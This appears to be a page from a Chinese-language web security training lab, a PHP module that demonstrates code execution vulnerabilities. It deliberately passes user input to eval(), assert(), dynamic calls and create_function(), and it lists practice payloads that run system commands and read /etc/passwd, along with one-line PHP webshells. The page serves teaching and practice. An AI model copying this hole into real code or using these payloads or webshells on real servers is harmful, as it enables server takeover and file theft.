<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot low"></span>
        <span class="badge badge-low">简单</span>
        <h2 style="margin:0">📝 PHP代码执行漏洞</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>演示各种PHP代码执行函数。与命令执行不同，代码执行直接运行PHP代码，
        可以调用任意PHP函数、操作文件、连接数据库等，危害更大。
    </div>

    <form method="POST">
        <div class="form-group">
            <label for="php_input">输入 PHP 代码：</label>
            <div class="form-row">
                <input type="text" name="php_input" id="php_input" 
                       placeholder='例如: system("whoami"); 或 phpinfo();'
                       value="<?php echo htmlspecialchars($_POST['php_input'] ?? ''); ?>">
                <select name="exec_func" id="exec_func">
                    <option value="eval" <?php echo ($_POST['exec_func']??'eval')=='eval'?'selected':''; ?>>eval()</option>
                    <option value="assert" <?php echo ($_POST['exec_func']??'')=='assert'?'selected':''; ?>>assert()</option>
                    <option value="dynamic_func" <?php echo ($_POST['exec_func']??'')=='dynamic_func'?'selected':''; ?>>动态函数</option>
                    <option value="call_user_func" <?php echo ($_POST['exec_func']??'')=='call_user_func'?'selected':''; ?>>call_user_func()</option>
                    <option value="create_function" <?php echo ($_POST['exec_func']??'')=='create_function'?'selected':''; ?>>create_function()</option>
                </select>
                <button type="submit" class="submit-btn">执行代码 ⚡</button>
            </div>
        </div>

        <div class="form-group">
            <label>参数（动态函数/call_user_func 需要）：</label>
            <div class="form-row">
                <input type="text" name="func_arg" placeholder="函数参数"
                       value="<?php echo htmlspecialchars($_POST['func_arg'] ?? 'whoami'); ?>">
            </div>
        </div>
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['php_input'])) {
        $input = $_POST['php_input'];
        $func = $_POST['exec_func'] ?? 'eval';
        $arg = $_POST['func_arg'] ?? '';

        echo '<div class="output-section">';
        echo '<h4>执行结果：</h4>';
        echo '<div class="output-box">';

        try {
            switch ($func) {
                case 'eval':
                    echo '<span class="info">// 使用 eval() 执行 PHP 代码</span>' . "\n";
                    eval($input);
                    break;

                case 'assert':
                    echo '<span class="info">// 使用 assert() 执行（PHP 7以下可执行代码，7以上只能判断）</span>' . "\n";
                    assert($input);
                    break;

                case 'dynamic_func':
                    echo '<span class="info">// 使用动态函数调用 $_GET["func"]()</span>' . "\n";
                    $func_name = trim($input);
                    if (function_exists($func_name)) {
                        echo "调用函数: {$func_name}('{$arg}')\n";
                        $func_name($arg);
                    } else {
                        echo "函数 {$func_name} 不存在或已被禁用\n";
                    }
                    break;

                case 'call_user_func':
                    echo '<span class="info">// 使用 call_user_func() 回调执行</span>' . "\n";
                    $func_name = trim($input);
                    if (function_exists($func_name)) {
                        call_user_func($func_name, $arg);
                    } else {
                        echo "函数 {$func_name} 不存在\n";
                    }
                    break;

                case 'create_function':
                    echo '<span class="info">// 使用 create_function() 创建匿名函数（PHP 7.2+ 已废弃）</span>' . "\n";
                    $lambda = create_function('$arg', $input);
                    echo $lambda($arg);
                    break;
            }
        } catch (Throwable $e) {
            echo '<span class="error">错误: ' . htmlspecialchars($e->getMessage()) . '</span>';
        }

        echo '</div>';
        echo '<div class="status-bar">';
        echo '<span><span class="label">执行函数:</span> ' . htmlspecialchars($func) . '()</span>';
        echo '<span><span class="label">代码:</span> <code>' . htmlspecialchars($input) . '</code></span>';
        echo '</div>';
        echo '</div>';
    }
    ?>

    <div class="tip-collapse">
        <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
            📚 源码与原理
        </div>
        <div class="tip-content">
            <h4>eval() - 最危险的函数</h4>
            <div class="source-code"><pre><span class="php">&lt;?php
// eval() 将字符串作为PHP代码执行
eval("\$result = 1 + 1;");
eval("system('whoami');");  // 可以执行任意PHP代码
?&gt;</span></pre></div>

            <h4>更多危险函数</h4>
            <div class="source-code"><pre><span class="php">&lt;?php
// assert() - PHP 7以下可执行代码
assert("system('whoami')");

// 动态函数 - 通过变量调用函数
\$f = 'system';
\$f('whoami');

// call_user_func - 回调函数
call_user_func('system', 'whoami');

// create_function - 创建匿名函数(PHP 7.2+废弃)
\$func = create_function('', 'system("whoami");');
\$func();

// array_map - 数组回调
array_map('system', ['whoami']);
?&gt;</span></pre></div>
        </div>
    </div>

    <div class="tip-collapse">
        <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
            🎯 推荐练习 Payload
        </div>
        <div class="tip-content">
            <h4>eval() 测试</h4>
            <ul class="payload-list">
                <li><code>system("whoami");</code></li>
                <li><code>phpinfo();</code></li>
                <li><code>echo "Hello RCE!";</code></li>
                <li><code>print_r(scandir('.'));</code></li>
                <li><code>echo file_get_contents('/etc/passwd');</code></li>
            </ul>

            <h4>动态函数测试</h4>
            <ul class="payload-list">
                <li>函数名: <code>system</code>，参数: <code>whoami</code></li>
                <li>函数名: <code>phpinfo</code>，参数: <code></code></li>
                <li>函数名: <code>file_get_contents</code>，参数: <code>/etc/passwd</code></li>
            </ul>

            <h4>一句话WebShell</h4>
            <ul class="payload-list">
                <li><code>@eval($_POST['cmd']);</code></li>
                <li><code>@system($_GET['cmd']);</code></li>
                <li><code>@assert($_POST['cmd']);</code></li>
            </ul>
        </div>
    </div>
</div>
